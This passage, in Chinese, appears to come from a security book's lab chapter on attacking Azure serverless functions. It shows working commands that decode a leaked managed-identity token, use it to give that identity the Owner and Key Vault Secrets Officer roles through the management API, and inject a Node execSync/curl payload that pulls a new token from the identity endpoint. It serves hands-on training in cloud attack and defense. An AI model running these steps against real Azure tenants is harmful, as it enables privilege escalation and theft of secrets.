

```
PAYLOAD=$(echo $ACCESS_TOKEN | cut -d "." -f2)
FIXED=$(echo "$PAYLOAD" | tr '_-' '/+' | \
    awk '{printf "%s%s", $0, substr("===", (length($0)%4)+1)}')

echo "$FIXED" | base64 --decode 2>/dev/null | jq -r '.oid'
```

### 10. 将检索到的 OID（主体 ID）存储到环境变量（`PRINCIPAL_ID`）中：

```
PRINCIPAL_ID="[SPECIFY OID VALUE]"
```

###### Caution

在运行命令之前，请确保将 `[SPECIFY OID VALUE]` 替换为适当的 `oid` 值。

### 11. 检索 Owner 角色 ID 并将其存储到环境变量（`OWNER_ROLE_ID`）中：

```
OWNER_ROLE_ID=$(az role definition list --name "Owner" \
    --query "[].id" -o tsv)

echo $OWNER_ROLE_ID
```

这会给出类似如下的输出值：

```
/subscriptions/.../providers/Microsoft.Authorization/roleDefinitions/...
```

### 12. 生成一个唯一标识符并将结果值存储到环境变量（`ROLE_ASSIGNMENT_ID`）中：

```
ROLE_ASSIGNMENT_ID=$(uuidgen)
```

### 13. 将 Owner 角色分配给无服务器函数的托管标识：

```
URL_1="https://management.azure.com/subscriptions/$SUBSCRIPTION_ID"
URL_2="providers/Microsoft.Authorization"
URL_3="roleAssignments/$ROLE_ASSIGNMENT_ID?api-version=2022-04-01"

URL="$URL_1/$URL_2/$URL_3"

curl -X PUT $URL \
     -H "Authorization: Bearer $ACCESS_TOKEN" \
     -H "Content-Type: application/json" \
     -d "{
           \"properties\": {
             \"roleDefinitionId\": \"$OWNER_ROLE_ID\",
             \"principalId\": \"$PRINCIPAL_ID\"
           }
         }"
```

###### Note

由于托管标识已被授予 User Access Administrator 角色，因此拥有其访问令牌的攻击者可以将其权限提升为 Owner（或其他任何角色）。

### 14. 检查 Key Vault Secrets Officer 角色的详细信息以查看其权限和范围：

```
az role definition list --name "Key Vault Secrets Officer" -o json
```

这会产生以下输出：

```
[
  {
    "assignableScopes": [
      "/"
    ],
    "createdBy": null,
    "createdOn": "2020-05-19T17:52:47.144924+00:00",
    "description": "Perform any action on the secrets of a key vault...",
    "id": ".../roleDefinitions/b86a8fe4-44ce-4948-aee5-eccb2c155cd7",
    "name": "b86a8fe4-44ce-4948-aee5-eccb2c155cd7",
    "permissions": [
      {
        "actions": [
          "Microsoft.Authorization/*/read",
          "Microsoft.Insights/alertRules/*",
          "Microsoft.Resources/deployments/*",
          "Microsoft.Resources/subscriptions/resourceGroups/read",
          "Microsoft.Support/*",
          "Microsoft.KeyVault/checkNameAvailability/read",
          "Microsoft.KeyVault/deletedVaults/read",
          "Microsoft.KeyVault/locations/*/read",
          "Microsoft.KeyVault/vaults/*/read",
          "Microsoft.KeyVault/operations/read"
        ],
        "condition": null,
        "conditionVersion": null,
        "dataActions": [
          "Microsoft.KeyVault/vaults/secrets/*"
        ],
        "notActions": [],
        "notDataActions": []
      }
    ],
    "roleName": "Key Vault Secrets Officer",
    "roleType": "BuiltInRole",
    "type": "Microsoft.Authorization/roleDefinitions",
    "updatedBy": null,
    "updatedOn": "2021-11-11T20:14:30.779347+00:00"
  }
]
```

在此，使用 Key Vault Secrets Officer 角色的主体可以对 Key Vault 的密钥执行任何操作，但管理权限除外。

### 15. 检索 Key Vault Secrets Officer 角色定义 ID 并将其存储到环境变量（`ROLE_DEFINITION_ID`）中：

```
ROLE_DEFINITION_DETAILS=$(az role definition list \
  --name "Key Vault Secrets Officer" -o json)

ROLE_DEFINITION_ID=$(echo $ROLE_DEFINITION_DETAILS | jq -r '.[0].id')
echo $ROLE_DEFINITION_ID
```

### 16. 生成一个唯一标识符并将结果值存储到环境变量（`ROLE_ASSIGNMENT_ID`）中：

```
ROLE_ASSIGNMENT_ID=$(uuidgen)
```

### 17. 将 Key Vault Secrets Officer 角色分配给 Azure 函数的托管标识：

```
URL_1="https://management.azure.com/subscriptions/$SUBSCRIPTION_ID"
URL_2="resourceGroups/$RESOURCE_GROUP/providers"
URL_3="Microsoft.KeyVault/vaults/$KEYVAULT_NAME"
URL_4="providers/Microsoft.Authorization"
URL_5="roleAssignments/$ROLE_ASSIGNMENT_ID?api-version=2022-04-01"

URL="$URL_1/$URL_2/$URL_3/$URL_4/$URL_5"

curl -X PUT $URL \
     -H "Authorization: Bearer $ACCESS_TOKEN" \
     -H "Content-Type: application/json" \
     -d "{
           \"properties\": {
             \"roleDefinitionId\": \"$ROLE_DEFINITION_ID\",
             \"principalId\": \"$PRINCIPAL_ID\"
           }
         }"
```

由于命令中使用的 `PRINCIPAL_ID` 对应于无服务器函数的托管标识的 OID，因此该角色分配授予该标识根据 Key Vault Secrets Officer 角色的权限对 Key Vault 密钥执行操作的能力。

###### Note

鉴于托管标识已被授予 User Access Administrator 和 Owner 角色，因此拥有其访问令牌的攻击者可以为其分配 Key Vault Secrets Officer 角色（或其他任何角色）。如果你想知道为什么需要单独分配 Key Vault Secrets Officer 角色，那是因为 Owner 角色仅授予对 Key Vault 资源的管理平面管理权限（不包括访问其中的密钥）。要读取或修改密钥（数据平面操作），托管标识还需要 Key Vault 特定角色，例如 Key Vault Secrets Officer。

让我们快速回顾一下你目前所拥有的内容。如 [Figure 12-2](#ch12.html#chapter-12-mid) 所示，你有一个无服务器函数，其托管标识关联了以下角色：Contributor、User Access Administrator、Owner 和 Key Vault Secrets Officer。

![](assets/lsse_1202.png)

由于函数应用的托管标识现在具有访问 Key Vault 密钥的权限，你将能够通过泄露的访问令牌直接检索密钥。此外，由于托管标识拥有 Owner 级别权限，因此获得其访问令牌的攻击者可以执行控制平面操作，例如分配或修改角色，从而可能被利用以获得数据平面访问权限。这意味着攻击者还可以使用托管标识访问 Serverless Lab 账户中的其他 Azure 资源，其影响范围取决于资源范围和角色分配。

### 1. 准备就绪后，让我们运行 `tester.rb` 脚本：

```
ruby tester.rb
```

### 2. 在脚本的 REPL 中输入 `Enter an expression (or type 'exit' to quit)` 之后，作为单行运行此命令以使用托管标识获取访问令牌。将输出值（`[OUTPUT RESPONSE]` 之后的部分）复制到本地文本文件（TAG：`ACCESS_TOKEN`）：

```
require("child_process").execSync(
   `curl -s -H "X-IDENTITY-HEADER: ${process.env.IDENTITY_HEADER}"
   "${process.env.IDENTITY_ENDPOINT}
   ?resource=https://management.azure.com/&api-version=2019-08-01"`,
   { encoding: "utf8" }
);
```

作为单行运行此命令以使用托管标识获取另一个访问令牌。将输出值（`[OUTPUT RESPONSE]` 之后的部分）复制到本地文本文件（TAG：`ACCESS_TOKEN_2`）：

